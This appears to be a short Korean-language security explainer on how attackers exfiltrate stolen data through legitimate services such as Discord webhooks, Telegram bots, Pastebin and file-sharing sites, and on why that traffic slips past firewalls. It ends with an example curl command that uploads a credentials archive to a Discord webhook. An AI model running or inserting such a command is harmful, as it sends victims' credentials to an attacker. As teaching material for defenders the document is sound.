Pastebin, Discord, Telegram 등 합법적 웹 서비스를 통한 데이터 유출

#1. 웹 서비스를 통한 유출이란?

📁 ➜ 🌐 ➜ 📤 ➜ 💀

"일상적인 웹 서비스로 은밀하게 데이터 빼내기"

공격자는 Pastebin, Discord Webhook, Telegram Bot, GitHub Gist 등 합법적 웹 서비스의 API를 이용해 탈취 데이터를 전송합니다. 이 트래픽은 정상적인 서비스 사용과 동일하게 보이며, HTTPS로 암호화되어 내용 검사가 어렵습니다.

왜 웹 서비스인가?

별도의 인프라 구축이 불필요하고, 무료로 사용 가능하며, 대부분의 기업 방화벽에서 Discord, Telegram, GitHub 트래픽을 허용합니다. 또한 서비스 제공자가 계정을 삭제해도 새 계정을 쉽게 만들 수 있습니다.

💬
메신저 API
Discord Webhook, Telegram Bot
📋
Paste 서비스
Pastebin, GitHub Gist
📁
파일 공유
file.io, transfer.sh

#2. 유출 채널별 분석

Discord Webhook

Discord 채널에 Webhook URL을 생성하면 HTTP POST만으로 파일과 텍스트를 전송할 수 있습니다. 인증 불필요, API 키 노출 위험 없음, 파일 첨부 25MB까지 가능합니다.

Telegram Bot API

Telegram Bot을 생성하여 sendDocument API로 파일을 전송합니다. 50MB까지 지원하며, 종단간 암호화로 서버 측에서도 내용을 볼 수 없습니다.

실전: Discord Webhook 유출

공격자가 Discord Webhook으로 탈취한 자격증명을 전송하는 사례입니다.

# Discord Webhook으로 데이터 유출
curl -X POST "https://discord.com/api/webhooks/123/abc"
-F "file=@credentials.zip"
-F "content=Target: CORP-PC01 | Creds: 47"
